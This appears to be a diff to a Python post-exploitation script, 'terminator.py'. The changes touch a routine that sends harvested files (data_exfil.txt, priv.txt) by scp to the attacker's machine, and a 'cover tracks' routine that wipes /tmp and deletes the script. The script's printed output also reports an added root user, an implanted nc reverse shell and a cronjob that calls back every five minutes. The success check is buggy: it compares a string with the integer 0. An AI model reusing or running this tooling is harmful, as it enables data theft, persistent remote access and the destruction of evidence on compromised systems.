@@ -631,14 +631,17 @@ def export(local_ip):
    time.sleep(2)
 
    # try to scp files to local machine using inputted username
-   try:
-      print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your password for local user {}+".format(u_root,local_ip,u_root))
-      os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
-   except:
-      print("\n*** error sending files to {}@{}:/terminator/\n*** specified user may not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
-      export(local_ip)
-   else:
-      print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
+   os.system("touch /tmp/scp.txt")
+   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your password for local user {}+".format(u_root,local_ip,u_root))
+   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/ && echo $? > /tmp/scp.txt".format(u_root,local_ip))
+
+   with open("/tmp/scp.txt") as sc:
+      s = sc.readline()
+      if s == 0:
+         print("\n### data_exfil.txt and priv.txt sent to {}/terminator/ ###".format(local_ip))
+      else:   
+         print("\n*** error sending files to {}@{}:/terminator/\n*** specified user might not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
+         export(local_ip)
 
 
 # cover tracks ###############################
@@ -682,6 +685,7 @@ def clear_tracks(username,password,local_ip,local_port):
    os.system("rm -f /tmp/shad_res.txt")
    os.system("rm -f /tmp/priv.txt")
    os.system("rm -f /tmp/print.txt")
+   os.system("rm -f /tmp/scp.txt")
    os.system("rm -rf /tmp/* 2>/dev/null")
 
    # print persistence info to screen
@@ -689,6 +693,8 @@ def clear_tracks(username,password,local_ip,local_port):
    print("- user {}:{} was added with root privileges".format(username,password))
    print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
    print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))
+
+   print("\n### data_exfil.txt and priv.txt sent to {}/terminator/ ###\n".format(local_ip))
 
    # delete terminator.py file
    os.system("rm -f terminator.py")
